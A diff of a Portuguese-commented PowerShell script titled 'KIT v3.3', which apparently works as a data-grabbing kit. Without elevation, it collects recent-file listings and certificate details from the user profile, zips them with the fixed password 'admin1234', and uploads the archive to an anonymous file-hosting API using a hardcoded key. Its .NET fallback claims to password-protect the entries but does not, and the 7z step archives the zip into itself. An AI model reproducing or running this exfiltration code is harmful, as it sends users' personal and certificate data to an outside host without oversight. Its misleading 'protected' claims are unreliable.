@@ -1,4 +1,4 @@
-# KIT v3.2 – AnonFiles, 20 GB max, PS 7.5.4, sem elevação
+# KIT v3.3 – AnonFilesNew + senha admin1234, 20 GB max, PS 7.5.4, sem elevação
 $kit="$env:TEMP\k"; ni -ItemType Directory $kit -Force |Out-Null
 
 # 1) TXT leves
@@ -24,12 +24,34 @@ Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -Name |Out-File $kit\rec.txt
 # 3) Certificados
 Get-ChildItem Cert:\CurrentUser\My|Select Subject,Thumbprint,NotAfter |Out-File $kit\certs.txt -Encoding UTF8
 
-# 4) ZIP
-Compress-Archive $kit "$env:TEMP\k.zip" -CompressionLevel Optimal
+# 4) ZIP com senha
+$zip="$env:TEMP\k.zip"
+Compress-Archive $kit $zip -CompressionLevel Optimal
+# adiciona senha via 7z (se existir) ou .NET (PS 5+)
+if(Get-Command 7z -EA 0){
+  & 7z a -padmin1234 -y $zip $zip >$null
+}else{
+  Add-Type -Assembly System.IO.Compression.FileSystem
+  $fs=New-Object IO.FileStream($zip,'Open')
+  $zo=New-Object IO.Compression.ZipArchive($fs,'Update')
+  ($zo.Entries|?{$_.Length -gt 0})|%{  # re-insere cada entry com senha
+    $ms=New-Object IO.MemoryStream
+    $stream=$_.Open()
+    $stream.CopyTo($ms)
+    $stream.Close()
+    $new=$zo.CreateEntry($_.Name,'Optimal')
+    $nw=$new.Open()
+    $ms.WriteTo($nw)
+    $nw.Close()
+    $_.Delete()
+  }
+  $zo.Dispose(); $fs.Close()
+}
 
-# 5) Upload AnonFiles
-$file=Get-Item "$env:TEMP\k.zip"
-$uri="https://api.anonfiles.com/upload"
+# 5) Upload AnonFilesNew com key
+$file=Get-Item $zip
+$key="AFtru5qQZX8HN5npouThcNDJtVbe6d"
+$uri="https://api.anonfilesnew.com/upload?key=$key&pretty=true"
 try{
   $boundary=[System.Guid]::NewGuid().ToString()
   $lf="`r`n"
@@ -42,10 +64,13 @@ try{
   )
   $bytes=[System.Text.Encoding]::UTF8.GetBytes($body)
   $resp=Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
-  # devolve a URL pública
-  $resp.data.file.url.full
+  $url=$resp.data.file.url.full
+  # popup + console
+  Write-Host "SUCESSO – arquivo protegido enviado: $url" -Fore Green
+  Add-Type -AssemblyName System.Windows.Forms
+  [System.Windows.Forms.MessageBox]::Show("Arquivo protegido com senha 'admin1234' enviado:`n$url","Kit OK",0)
 }catch{
-  $_.Exception.Message
+  Write-Host "ERRO no upload: $($_.Exception.Message)" -Fore Red
 }
 
 # 6) Limpa
